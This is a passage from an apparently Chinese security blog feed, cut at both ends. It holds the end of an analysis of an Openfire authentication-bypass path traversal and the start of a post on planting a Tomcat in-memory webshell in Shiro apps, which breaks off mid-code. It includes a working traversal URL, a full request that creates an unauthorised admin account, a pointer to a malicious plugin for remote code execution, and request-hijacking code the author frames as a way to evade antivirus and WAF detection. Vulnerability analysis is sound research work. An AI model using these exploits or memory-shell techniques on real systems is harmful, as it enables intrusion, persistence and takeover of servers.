class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decodePath</span><span class="params">(String path, <span class="type">int</span> offset, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Utf8StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> offset + length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; end; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> path.charAt(i);</span><br><span class="line">            <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (builder == <span class="literal">null</span>) &#123;</span><br><span class="line">                        builder = <span class="keyword">new</span> <span class="title class_">Utf8StringBuilder</span>(path.length());</span><br><span class="line">                        builder.append(path, offset, i - offset);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ((i + <span class="number">2</span>) &lt; end) &#123;</span><br><span class="line">                        <span class="type">char</span> <span class="variable">u</span> <span class="operator">=</span> path.charAt(i + <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">if</span> (u == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                            <span class="comment">// In Jetty-10 UTF16 encoding is only supported with UriCompliance.Violation.UTF16_ENCODINGS.</span></span><br><span class="line">                            <span class="comment">// This is wrong. This is a codepoint not a char</span></span><br><span class="line">                            builder.append((<span class="type">char</span>)(<span class="number">0xffff</span> &amp; TypeUtil.parseInt(path, i + <span class="number">2</span>, <span class="number">4</span>, <span class="number">16</span>)));</span><br><span class="line">                            i += <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            builder.append((<span class="type">byte</span>)(<span class="number">0xff</span> &amp; (TypeUtil.convertHexDigit(u) * <span class="number">16</span> + TypeUtil.convertHexDigit(path.charAt(i + <span class="number">2</span>)))));</span><br><span class="line">                            i += <span class="number">2</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Bad URI % encoding&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> (builder != <span class="literal">null</span>)</span><br><span class="line">                        builder.append(c);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> builder.toString();</span><br><span class="line">        <span class="keyword">if</span> (offset == <span class="number">0</span> &amp;&amp; length == path.length())</span><br><span class="line">            <span class="keyword">return</span> path;</span><br><span class="line">        <span class="keyword">return</span> path.substring(offset, end);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotUtf8Exception e) &#123;</span><br><span class="line">        LOG.debug(path.substring(offset, offset + length) + <span class="string">&quot; &quot;</span> + e);</span><br><span class="line">        <span class="keyword">return</span> decodeISO88591Path(path, offset, length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;cannot decode URI&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据如上代码的逻辑，当传入<code>%u002e</code>字符串到<code>decodePath</code>方法时，它会对该字符串进行解码处理。</p><ol><li><p>首先，方法进入循环，遍历字符串中的字符。</p></li><li><p>在循环中，遇到字符<code>%</code>，表示接下来的字符是需要解码的。</p></li><li><p>方法检查接下来的字符是否为<code>u</code>。因为<code>%u002e</code>中的<code>u</code>是小写的，所以会执行以下代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (u == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">    builder.append((<span class="type">char</span>)(<span class="number">0xffff</span> &amp; parseInt(path, i + <span class="number">2</span>, <span class="number">4</span>, <span class="number">16</span>)));</span><br><span class="line">    i += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>方法调用<code>TypeUtil.parseInt</code>方法解析四个字符<code>002e</code>，并将解析结果作为一个字符添加到<code>builder</code>中。这里的<code>TypeUtil.parseInt</code>方法会将十六进制字符解析为对应的数值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">parseInt</span><span class="params">(String s, <span class="type">int</span> offset, <span class="type">int</span> length, <span class="type">int</span> base)</span> <span class="keyword">throws</span> NumberFormatException &#123;</span><br><span class="line">  <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (length &lt; <span class="number">0</span>)</span><br><span class="line">    length = s.length() - offset;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(offset + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">digit</span> <span class="operator">=</span> convertHexDigit((<span class="type">int</span>) c);</span><br><span class="line">    <span class="keyword">if</span> (digit &lt; <span class="number">0</span> || digit &gt;= base)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NumberFormatException</span>(s.substring(offset, offset + length));</span><br><span class="line">    value = value * base + digit;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>解析结果为<code>.</code>的Unicode码点（0x002e）。</p></li><li><p><code>(char)(0xffff &amp; TypeUtil.parseInt(path, i + 2, 4, 16))</code>将Unicode码点强制转换为一个字符，并将其添加到<code>builder</code>中。</p></li><li><p><code>i += 5</code>用于跳过解码的字符，即<code>%u002e</code>中的<code>u002e</code>。</p></li></ul></li><li><p>循环继续，因为已经处理完<code>%u002e</code>，下一个字符是正常字符<code>.</code>。</p></li><li><p>方法将<code>.</code>直接添加到<code>builder</code>中。</p></li><li><p>循环结束，根据<code>builder</code>的内容生成一个新的字符串，并将其返回。</p></li></ol><p>当然，也可以运行看看实际的结果，创建一个新项目，并导入如下版本的maven依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.eclipse.jetty/jetty-util --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-util<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.4.43.v20210629<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后编写如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jetty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.util.URIUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">decodedNonCanonical</span> <span class="operator">=</span> URIUtil.decodePath(path);</span><br><span class="line">        System.out.println(<span class="string">&quot;decodedNonCanonical: &quot;</span> + decodedNonCanonical);</span><br><span class="line">        <span class="type">String</span> <span class="variable">decodedPath</span> <span class="operator">=</span> URIUtil.canonicalPath(decodedNonCanonical);</span><br><span class="line">        <span class="keyword">if</span> (decodedPath == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Bad URI&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;decodedPath: &quot;</span> + decodedPath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先<code>URIUtil.decodePath</code>将<code>/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</code>解码为<code>/setup/setup-s/../../log.jsp</code>，接着<code>URIUtil.canonicalPath</code>方法将该路径规范化处理成<code>/log.jsp</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-<span class="number">06</span>-<span class="number">15</span> <span class="number">16</span>:<span class="number">33</span>:<span class="number">47.987</span>:INFO::main: Logging initialized @272ms to org.eclipse.jetty.util.log.StdErrLog</span><br><span class="line">decodedNonCanonical: /setup/setup-s/../../log.jsp</span><br><span class="line">decodedPath: /log.jsp</span><br></pre></td></tr></table></figure><p>在维基百科的说法中，<code>%uxxxx</code>这种形式的编码是一种非标准的Unicode字符编码方式，其中xxxx表示一个UTF-16代码单元，由四个十六进制数字表示。这种行为没有被任何RFC规范指定，并且被W3C拒绝。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p>在一个未登录Openfire的浏览器中，通过如下请求路径，如果显示部分日志文件则表明存在漏洞，如果重定向到登录页面，则表明无漏洞。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure><h3 id="未授权用户创建"><a href="#未授权用户创建" class="headerlink" title="未授权用户创建"></a>未授权用户创建</h3><p>创建一个账号和密码为admin2&#x2F;admin2的管理员用户。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=Jm6f0wY78QMP8jj&amp;username=admin2&amp;name=admin2&amp;email=admin2%40example.com&amp;password=admin2&amp;passwordConfirm=admin2&amp;isadmin=on&amp;create=Create+User</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 14 Jun 2023 06:47:48 GMT</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html;charset=utf-8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>csrf=NX7COAs1lgRsMdd; Path=/; HttpOnly</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6187</span><br><span class="line"></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">    <span class="keyword">Exception</span>:</span></span><br><span class="line"><span class="language-ada">……</span></span><br></pre></td></tr></table></figure><h3 id="插件上传实现RCE"><a href="#插件上传实现RCE" class="headerlink" title="插件上传实现RCE"></a>插件上传实现RCE</h3><p>登录如上创建的管理员用户，在后台添加恶意插件然后实现远程代码执行。恶意插件的实现可以是自己基于Openfire已有的插件进行二开，也可以使用如下恶意插件。</p><ul><li><a href="https://github.com/vulhub/openfire-fastpath-plugin">https://github.com/vulhub/openfire-fastpath-plugin</a></li></ul><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>目前厂商已升级了安全版本以修复这个安全问题，请到厂商的发布主页下载安全版本：</p><p><a href="https://github.com/igniterealtime/Openfire/releases">https://github.com/igniterealtime/Openfire/releases</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></li><li><a href="https://igniterealtime.atlassian.net/browse/OF-2595">https://igniterealtime.atlassian.net/browse/OF-2595</a></li><li><a href="https://igniterealtime.atlassian.net/browse/JM-1489">https://igniterealtime.atlassian.net/browse/JM-1489</a></li><li><a href="https://en.wikipedia.org/wiki/URL_encoding#Non-standard_implementations">https://en.wikipedia.org/wiki/URL_encoding#Non-standard_implementations</a></li><li><a href="https://github.com/vulhub/openfire-fastpath-plugin">https://github.com/vulhub/openfire-fastpath-plugin</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Tomcat内存马攻击Shiro应用</title>
      <link href="/attacking-shiro-with-tomcat-memshell.html"/>
      <url>/attacking-shiro-with-tomcat-memshell.html</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="#%E8%83%8C%E6%99%AF">背景</a></p></li><li><p><a href="#%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">请求与响应</a></p></li><li><p><a href="#%E5%9B%9E%E6%98%BE%E8%BE%93%E5%87%BA">回显输出</a></p></li><li><p><a href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Filter型内存马</a></p><ul><li><a href="#StandardContext">StandardContext</a></li><li><a href="#Request%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BD%AC%E6%8D%A2">Request对象的转换</a></li><li><a href="#defineClass">defineClass</a></li></ul></li><li><p><a href="#%E5%B7%A5%E5%85%B7%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8">工具自动化利用</a></p><ul><li><a href="#TomcatEcho">TomcatEcho</a></li><li><a href="#FilterMemShell">FilterMemShell</a></li></ul></li><li><p><a href="#%E5%8F%82%E8%80%83">参考</a></p></li></ul><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在前面Shiro利用的文章中，都是直接利用反序列化漏洞对Shiro应用进行攻击，使其弹出一个计算器，这当然只是在实验环境中，对漏洞成功利用的一个简单概念验证。在实战环境中，没法这么干，原因有二，一是我们很难得知被攻击机器是否成功执行了命令，特别是在目标机器不出网的环境下；基于一，我们可能会尝试上传WebShell文件，但这种方式尤其是在当下各类防御设备齐出马的形势下，极大可能会被杀软或WAF检测到，从而使得攻击被察觉，这就是原因二，落地Webshell文件容易被安全设备发现。</p><p>在前面<a href="https://0xf4n9x.github.io/tomcat-filter-memshell.html">《Tomcat Filter型内存马》</a>一文中，是通过上传一个JSP的Webshell文件，访问并执行来达到内存马的注入，但这似乎也背离了内存马无文件落地的初衷。</p><p>由此，在这篇文章中将解决以上痛点，利用反序列化漏洞实现命令执行的回显输出，并结合内存马注入达到真正的无文件落地、内存马常驻以提升攻击的隐蔽性。</p><h2 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h2><p>当客户端发送一个HTTP请求到Tomcat服务器时，Tomcat会创建一个Request对象来封装请求信息，随后这个Request对象会被传递给相应的Servlet或Filter进行处理，处理完成后，最后会通过Response对象设置响应信息。</p><p>想要达到命令执行结果作为响应回显输出，就必然需要先控制HTTP请求与响应对象，在Tomcat中用于处理HTTP请求与响应的核心类是org.apache.coyote.Request和org.apache.coyote.Response。</p><p><img src="/img/post/attacking-shiro-with-tomcat-memshell/0.png"></p><p><img src="/img/post/attacking-shiro-with-tomcat-memshell/1.png"></p><p>Request类封装了客户端发送到服务器的所有请求信息，包括请求行、头信息、参数和正文内容，而Response类封装了服务器发送给客户端的所有响应信息，包括状态码、头信息和正文内容。</p><p>受<a href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》</a>一文得到的启发，我们通过遍历线程组来寻找Request和Response对象。</p><p><img src="/img/post/attacking-shiro-with-tomcat-memshell/2.png"></p><p>构造如下核心代码用于获取Request对象，有了Request，Response便也能获取到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; threads.length; ++i) &#123;</span><br><span class="line">    <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> threads[i];</span><br><span class="line">    <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">        <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    obj = getFieldValue(getFieldValue(getFieldValue(obj, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                java.util.<span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (java.util.List) getFieldValue(obj,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>; n &lt; processors.size(); ++n) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">processor</span> <span class="operator">=</span> processors.get(n);</span><br><span class="line">                    obj = getFieldValue(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> obj.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> (String) obj.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Host&quot;</span>)&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (host != <span class="literal">null</span> &amp;&amp; !host.isEmpty()) &#123;</span><br><span class="line">                        <span class="comment">// ...</span></span><br><span class="line">                        flag = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中getFieldValue方法通过反射获取对象的私有字段或受保护字段的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String field)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cls != Object.class) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = cls.getDeclaredField(field);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            cls = cls.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(field);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回显输出"><a href="#回显输出" class="headerlink" title="回显输出"></a>回显输出</h2><p>既然成功获取到了Request和Response，那便可以构造Tomcat回显的核心代码了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 